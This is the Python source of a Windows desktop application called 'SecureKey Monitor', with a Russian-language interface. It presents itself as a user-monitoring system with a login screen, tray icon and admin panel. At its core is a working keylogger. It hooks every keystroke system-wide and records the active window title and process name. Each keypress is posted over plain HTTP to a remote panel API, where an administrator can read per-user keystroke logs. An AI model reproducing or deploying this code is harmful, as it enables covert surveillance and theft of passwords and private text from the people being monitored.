import sys
import keyboard
import ctypes
import hashlib
import datetime
import json
import requests
import re
import psutil
import threading

from server import *
#from keylogger import *

from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QSystemTrayIcon, QMenu, QAction, QGraphicsView, QGraphicsScene, QGraphicsEllipseItem


language_codes = {
    '0x409': 'English - United States',
    '0x809': 'English - United Kingdom',
    '0x419': 'Russian',
}
latin_into_cyrillic = (
                        "`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
                        "qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
                        "~`{[}]:;\"'|<,>.?/@#$^&",

                        "ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
                        "йцукенгшщзхъфывапролджэячсмитьбю." +
                        "ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?"
                    )
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])
latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])
cyrillic_layouts = ['Russian', 'Belarusian', 'Kazakh', 'Ukrainian']

window_title = ""
process_name = ""
temp_username = ""
thread_breaker = False


def detect_keyboard_layout_win():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()

    # Get the window title
    length = user32.GetWindowTextLengthW(curr_window)
    buff = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(curr_window, buff, length + 1)
    
    global window_title
    window_title = buff.value

    # Get the process ID
    pid = ctypes.wintypes.DWORD()
    user32.GetWindowThreadProcessId(curr_window, ctypes.byref(pid))
    process_id = pid.value
    
    # Get the process name
    global process_name
    process_name = psutil.Process(process_id).name()

    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x419'] # Russian
    return language

def cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language):
    if ord(key_pressed) in cyrillic_into_latin_trantab:
        key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])
    elif current_keyboard_language in cyrillic_layouts and initial_keyboard_language not in cyrillic_layouts:
        if ord(key_pressed) in latin_into_cyrillic_trantab:
            key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])
    return key_pressed

def create_keypress_callback(username):
    def keypress_callback(event):
        key_pressed = event.name
        current_keyboard_language = detect_keyboard_layout_win()
        if len(key_pressed) == 1:
            if 'English' in current_keyboard_language and 'English' not in initial_keyboard_language:
                key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)
            if 'Russian' in current_keyboard_language and 'Russian' not in initial_keyboard_language:
                key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)
        
        payload = {"keyboardData" : key_pressed}

        r = requests.post(f"http://{servername}/panel/api/json.php", json=payload, 
            headers={
                b"Content-Type": b"application/json; charset=utf-8",
                b"X-USERNAME": username.encode('utf-8'),
                b"X-APPLICATION": process_name.encode('utf-8'),
                b"X-APPLICATION-TITLE": window_title.encode('utf-8')
            }
        )

    return keypress_callback

class c_LoginUI(QtWidgets.QWidget):
    def __init__(self, MainWindow):
        QtWidgets.QWidget.__init__(self)
        self.MainWindow = MainWindow

        MainWindow.setObjectName("LoginUI")
        MainWindow.resize(700, 400)
        MainWindow.setMinimumSize(QtCore.QSize(0, 0))
        MainWindow.setMinimumSize(QtCore.QSize(700, 400))
        MainWindow.setMaximumSize(QtCore.QSize(700, 400))
        MainWindow.setStyleSheet("background-color: rgb(0, 255, 255);")
        MainWindow.setWindowTitle("SecureKey Monitor")

        self.centralwidget = QtWidgets.QWidget(self)
        self.centralwidget.setObjectName("centralwidget")
        
        self.MainText = QtWidgets.QLabel(self.centralwidget)
        self.MainText.setEnabled(True)
        self.MainText.setGeometry(QtCore.QRect(0, 20, 720, 40))
        self.MainText.setObjectName("MainText")
        self.MainText.setText("<html><head/><body><p align=\"center\"><span style=\" font-size:28pt; color:#ffffff;\">SecureKey Monitor<br/></span></p></body></html>")
        
        self.EnterButton = QtWidgets.QPushButton(self.centralwidget)
        self.EnterButton.setEnabled(True)
        self.EnterButton.setGeometry(QtCore.QRect(265, 310, 141, 40))
        self.EnterButton.setStyleSheet("color: rgb(255, 255, 255); background-color: rgb(0, 110, 245); border-radius: 20px; font-size: 12pt")
        self.EnterButton.setObjectName("EnterButton")
        self.EnterButton.setText("Войти")
        self.EnterButton.clicked.connect(self.CheckLogin)

        self.UsernameIcon = QtWidgets.QLabel(self.centralwidget)
        self.UsernameIcon.setGeometry(QtCore.QRect(145, 125, 121, 30))
        self.UsernameIcon.setObjectName("UsernameIcon")
        self.UsernameIcon.setText("<html><head/><body><p><span style=\" font-size:14pt; color:#ffffff;\">Логин:</span></p></body></html>")

        self.PasswordIcon = QtWidgets.QLabel(self.centralwidget)
        self.PasswordIcon.setGeometry(QtCore.QRect(145, 210, 121, 30))
        self.PasswordIcon.setObjectName("PasswordIcon")
        self.PasswordIcon.setText("<html><head/><body><p><span style=\" font-size:14pt; color:#ffffff;\">Пароль:</span></p></body></html>")

        self.UsernameText = QtWidgets.QLineEdit(self.centralwidget)
        self.UsernameText.setGeometry(QtCore.QRect(145, 160, 400, 30))
        self.UsernameText.setStyleSheet("background-color: rgb(75, 75, 75); color: rgb(255, 255, 255); border-radius: 5px; font-size: 9pt")
        self.UsernameText.setObjectName("UsernameText")
        self.UsernameText.setMaxLength(28)  # Устанавливаем ограничение по количеству символов
        self.UsernameText.setTextMargins(10, 0, 0, 0)  # Добавляем отступ от левого края

        self.PasswordText = QtWidgets.QLineEdit(self.centralwidget)
        self.PasswordText.setEchoMode(QtWidgets.QLineEdit.Password)
        self.PasswordText.setGeometry(QtCore.QRect(145, 250, 400, 30))
        self.PasswordText.setStyleSheet("background-color: rgb(75, 75, 75); color: rgb(255, 255, 255); border-radius: 5px; font-size: 9pt")
        self.PasswordText.setObjectName("PasswordText")
        self.PasswordText.setMaxLength(28)  # Устанавливаем ограничение по количеству символов
        self.PasswordText.setTextMargins(10, 0, 0, 0)  # Добавляем отступ от левого края


        self.show_password_button = QtWidgets.QPushButton(self.centralwidget)
        self.show_password_button.setGeometry(QtCore.QRect(510, 245, 40, 40))
        self.show_password_button.setIcon(QtGui.QIcon(".\show.png"))
        self.show_password_button.setCheckable(True)
        self.show_password_button.setFlat(True)
        self.show_password_button.setStyleSheet("background: none; border: none;")

        # Connect button signal to slot
        self.show_password_button.toggled.connect(self.toggle_password_visibility)

        self.LabelText = QtWidgets.QLabel(self.centralwidget)
        self.LabelText.setGeometry(QtCore.QRect(0, 70, 701, 16))
        self.LabelText.setObjectName("LabelText")
        self.LabelText.setText("<html><head/><body><p align=\"center\"><span style=\" font-size:9pt; color:#ffffff;\">Мониторинг система</span></p></body></html>")

        QtCore.QMetaObject.connectSlotsByName(self)

    def CheckLogin(self):
        username = self.UsernameText.text()
        password = self.PasswordText.text()
        hashed_password = hashlib.sha256(password.encode()).hexdigest()
        
        result_of_auth = c_server.auth(username, hashed_password)
        if result_of_auth == "Successful admin user":
            self.MainWindow.show_admin_panel()
        elif result_of_auth == "Successful standart user":
            global temp_username
            temp_username = username
            self.MainWindow.start(username)
            self.MainWindow.hide()

    def toggle_password_visibility(self, checked):
        if checked:
            self.PasswordText.setEchoMode(QtWidgets.QLineEdit.Normal)
            self.show_password_button.setIcon(QtGui.QIcon(".\show.png"))
        else:
            self.PasswordText.setEchoMode(QtWidgets.QLineEdit.Password)
            self.show_password_button.setIcon(QtGui.QIcon(".\hide.png"))
    


class c_AdminUI(QtWidgets.QWidget):
    def __init__(self, MainWindow):
        QtWidgets.QWidget.__init__(self)
        self.MainWindow = MainWindow
        
        MainWindow.setObjectName("c_AdminUI")
        MainWindow.resize(720, 640)
        MainWindow.setMaximumSize(QtCore.QSize(720, 640))
        MainWindow.setStyleSheet("background-color: rgb(35, 35, 35);")
        self.centralwidget = QtWidgets.QWidget(self)
        self.centralwidget.setObjectName("centralwidget")
        
        # Create and style the label
        UserLabel = QtWidgets.QLabel("Список пользователей", self.centralwidget)
        UserLabel.setStyleSheet("color: rgb(255, 255, 255); font-size: 10pt;")
        UserLabel.setGeometry(QtCore.QRect(32, 10, 200, 15))  # Set position (x, y) and size (width, height)
        # Create and style the list widget
        self.UsersList = QtWidgets.QListWidget(self.centralwidget)
        self.UsersList.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.UsersList.setObjectName("UsersList")
        self.UsersList.setGeometry(QtCore.QRect(0, 29, 190, 602))  # Set position (x, y) and size (width, height)
        
        users = c_server.getAllUsers()
        for user in users:
            item = QtWidgets.QListWidgetItem(user)
            self.UsersList.addItem(item)
        
        self.UsersList.itemClicked.connect(self.onUserClicked)
        
        self.listWidget = QtWidgets.QTreeWidget(self.centralwidget)
        self.listWidget.setColumnCount(3)
        self.listWidget.setGeometry(QtCore.QRect(200, 5, 498, 310))
        self.listWidget.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.listWidget.setObjectName("listWidget")
        self.listWidget.setHeaderLabels(['Дата и время', 'Приложение', 'Название окна'])  # Устанавливаем заголовок столбца
        
        # Устанавливаем фиксированную ширину для последней колонки
        self.listWidget.setColumnWidth(0, 150)  # Ширина первой колонки
        self.listWidget.setColumnWidth(1, 150)  # Ширина второй колонки
        self.listWidget.setColumnWidth(2, 198)  # Ширина третьей колонки

        # Настраиваем QHeaderView для управления поведением колонок
        header = self.listWidget.header()
        header.setStretchLastSection(False)
        header.setSectionResizeMode(0, QtWidgets.QHeaderView.ResizeToContents)
        header.setSectionResizeMode(1, QtWidgets.QHeaderView.ResizeToContents)
        header.setSectionResizeMode(2, QtWidgets.QHeaderView.ResizeToContents)  
        # Позволяет изменять ширину вручную .Interactive
        
        LogsLabel = QtWidgets.QLabel("Нажатия пользователей", self.centralwidget)
        LogsLabel.setStyleSheet("color: rgb(255, 255, 255); font-size: 10pt;")
        LogsLabel.setGeometry(QtCore.QRect(200, 323, 150, 15))  # Set position (x, y) and size (width, height)
        
        self.logsList = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.logsList.setReadOnly(True)
        self.logsList.setGeometry(QtCore.QRect(200, 348, 500, 280))
        self.logsList.setStyleSheet("background-color: rgb(255, 255, 255);") 
        self.logsList.setObjectName("logsList")

        self.RefreshButton = QtWidgets.QPushButton(self.centralwidget)
        self.RefreshButton.setEnabled(True)
        self.RefreshButton.setGeometry(QtCore.QRect(599, 319, 100, 25))
        self.RefreshButton.setStyleSheet("color: rgb(75, 75, 75); background-color: rgb(255, 255, 255);")
        self.RefreshButton.setObjectName("RefreshButton")
        self.RefreshButton.setText("Обновить")
        self.RefreshButton.clicked.connect(self.refreshEverything)

        self.currentUser = None

        # Добавление QGraphicsView для рисования круга
        self.graphicsView = QGraphicsView(self.centralwidget)
        self.graphicsView.setGeometry(QtCore.QRect(260, 233, 200, 200))
        self.graphicsView.setStyleSheet("background: transparent; border: none;")
        self.graphicsView.setObjectName("graphicsView")
        self.graphicsView.setRenderHint(QtGui.QPainter.Antialiasing)
        
        # Создаем графическую сцену и элемент эллипса (круга)
        scene = QGraphicsScene()
        scene.setBackgroundBrush(QtCore.Qt.transparent)  # Устанавливаем прозрачный фон для сцены

        self.ellipse = QGraphicsEllipseItem(QtCore.QRectF(0, 0, 15, 15))
        
        # Добавляем эллипс на сцену
        scene.addItem(self.ellipse)
        
        # Устанавливаем сцену в представлении
        self.graphicsView.setScene(scene)
        
        QtCore.QMetaObject.connectSlotsByName(self)

    def setEllipseColor(self):
        active_status  = c_server.getCurrentActive(self.currentUser)
        # Метод для установки цвета круга в зависимости от статуса
        if active_status == "1":
            self.ellipse.setBrush(QtGui.QColor(0, 255, 0))  # Зеленый цвет
        else:
            self.ellipse.setBrush(QtGui.QColor(255, 0, 0))  # Красный цвет

    def updateTreeWidgetLogs(self):
        self.listWidget.clear() # TODO temp comment
        logs = c_server.getApplicationLogs(self.currentUser)
        if logs:
            # Примерно преобразуем данные, чтобы добавить дату и время
            for log in logs:
                date_time = log.get('created_at', '')
                application = log.get('application', '')
                application_title = log.get('application_title', '')
                item = QtWidgets.QTreeWidgetItem([date_time, application, application_title])
                self.listWidget.addTopLevelItem(item)
    
    def onUserClicked(self, item):
        self.currentUser = item.text()
        self.setEllipseColor()
        self.updateLogs()
        self.updateTreeWidgetLogs()

    def refreshEverything(self):
        if self.currentUser:
            self.updateLogs()
            self.updateTreeWidgetLogs()
            self.setEllipseColor()


    def updateLogs(self):
        # Очищаем logsList перед загрузкой новых данных
        self.logsList.clear()
        
        # Получаем логи для выбранного пользователя
        logs = c_server.getLogs(self.currentUser)

        replacements = {
            "backspace": "[backspace]",
            "ctrl": "[ctrl]",
            "right ctrl": "[right ctrl]",
            "shift": "[shift]",
            "right shift": "[right shift]",
            "caps lock": "[caps lock]",
            "menu": "[menu]",
            "esc": "[esc]",
            "alt": "[alt]",
            "alt gr": "[right alt]",
            "f1": "[F1]",
            "f1": "[F1]",
            "f2": "[F2]",
            "f3": "[F3]",
            "f4": "[F4]",
            "f5": "[F5]",
            "f6": "[F6]",
            "f7": "[F7]",
            "f8": "[F8]",
            "f9": "[F9]",
            "f10": "[F10]",
            "f11": "[F11]",
            "f12": "[F12]",
            "tab": "[tab]",
            "enter": "[enter]",
            "delete": "[delete]",
            "home": "[home]",
            "end": "[end]",
            "page up": "[page up]",
            "page down": "[page down]",
            "insert": "[insert]",
            "up": "[arrow up]",
            "down": "[arrow down]",
            "left": "[arrow left]",
            "right": "[arrow right]",
            "print screen": "[print screen]",
            "pause": "[pause]",
            "num lock": "[num lock]",
            "scroll lock": "[scroll lock]",
            "break": "[break]",
            "insert": "[insert]",
            "space": "[space] ",
            "left windows": "[windows]"
        }

        # Создаем регулярное выражение, которое будет находить каждое ключевое слово целиком
        pattern = re.compile(r'\b(' + '|'.join(map(re.escape, replacements.keys())) + r')\b')

        # Выполняем замену в каждом логе
        for i, log in enumerate(logs):
            # Производим замену в каждом поле лога (если это строка)
            if isinstance(log, str):
                # Заменяем символы в строке на основе регулярного выражения
                logs[i] = pattern.sub(lambda x: replacements[x.group()], log)
            elif isinstance(log, dict):
                # Проходим по каждому значению в словаре и заменяем его, если это строка
                for key, value in log.items():
                    if isinstance(value, str):
                        # Заменяем символы в значении на основе регулярного выражения
                        log[key] = pattern.sub(lambda x: replacements[x.group()], value)

        logs_text = ''.join(map(str, logs))

        #Добавляем логи в logsList
        self.logsList.setPlainText(logs_text)

class c_MainWindow(QtWidgets.QWidget):
    def __init__(self):
        QtWidgets.QWidget.__init__(self)
  
        self.setWindowIcon(QtGui.QIcon(".\logo.png"))
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("SecureKey Monitor")
        # Остальные виджеты
        self.stacked_widget = QtWidgets.QStackedWidget()
        self.login_ui = c_LoginUI(self)
        self.admin_panel_ui = c_AdminUI(self) 
        self.stacked_widget.addWidget(self.login_ui)
        self.stacked_widget.addWidget(self.admin_panel_ui)

        layout = QtWidgets.QVBoxLayout(self)  # Passing self to the layout constructor
        layout.addWidget(self.stacked_widget)
        self.setLayout(layout)
        self.show_login_ui()

    def show_login_ui(self):
        self.stacked_widget.setCurrentWidget(self.login_ui)

    def show_admin_panel(self):
        self.stacked_widget.setCurrentWidget(self.admin_panel_ui)

    def create_colored_icon(self, color):
        size = 20  # Размер пиксмапа
        margin = 2  # Поля для уменьшения круга
        pixmap = QtGui.QPixmap(size, size)
        pixmap.fill(QtCore.Qt.transparent)  # Убедимся, что фон прозрачный
        painter = QtGui.QPainter(pixmap)
        painter.setRenderHint(QtGui.QPainter.Antialiasing)  # Включаем сглаживание
        painter.setBrush(color)
        
        painter.drawEllipse(1, 1, size - margin, size - margin)
        painter.end()
        return QtGui.QIcon(pixmap)

    def start(self, username):
        thread_breaker = False

        self.tray_icon = QSystemTrayIcon()

        # Создаем иконки
        self.red_icon = self.create_colored_icon(QtCore.Qt.red)
        self.green_icon = self.create_colored_icon(QtCore.Qt.green)

        # Устанавливаем иконку по умолчанию
        self.tray_icon.setIcon(self.red_icon)
        
        # Создаем меню
        self.menu = QMenu()
        
        # Создаем действия
        self.start_action = QAction("Start")
        self.stop_action = QAction("Stop")
        self.stop_action.setEnabled(False)
        
        # Добавляем действия в меню
        self.menu.addAction(self.start_action)
        self.menu.addAction(self.stop_action)
        
        # Устанавливаем меню для трей-иконки
        self.tray_icon.setContextMenu(self.menu)
        
        # Устанавливаем видимость трей-иконки
        self.tray_icon.setVisible(True)
        
        # Подключаем сигналы к слотам
        self.start_action.triggered.connect(self.start)
        self.stop_action.triggered.connect(self.stop)

        self.tray_icon.setIcon(self.green_icon)
        self.start_action.setEnabled(False)
        self.stop_action.setEnabled(True)

        c_server.setCurrentActive(temp_username, 1)

        #Automatically start the keylogger
        if not thread_breaker:
            self.keylogger_thread = threading.Thread(target=self.run_keylogger, args=(temp_username,))
            self.keylogger_thread.start()
        

    def stop(self):
        # Pausing the keylogger 
        thread_breaker = True
        if thread_breaker:
            keyboard.unhook_all()

        c_server.setCurrentActive(temp_username, 0)

        self.tray_icon.setIcon(self.red_icon)
        self.start_action.setEnabled(True)
        self.stop_action.setEnabled(False)

    def run_keylogger(self, username):
        keypress_callback_with_username = create_keypress_callback(username)
        keyboard.on_press(keypress_callback_with_username)
        keyboard.wait()
        


if __name__ == "__main__":
    initial_keyboard_language = detect_keyboard_layout_win()
    app = QtWidgets.QApplication(sys.argv)
    window = c_MainWindow()
    window.show()
    sys.exit(app.exec_())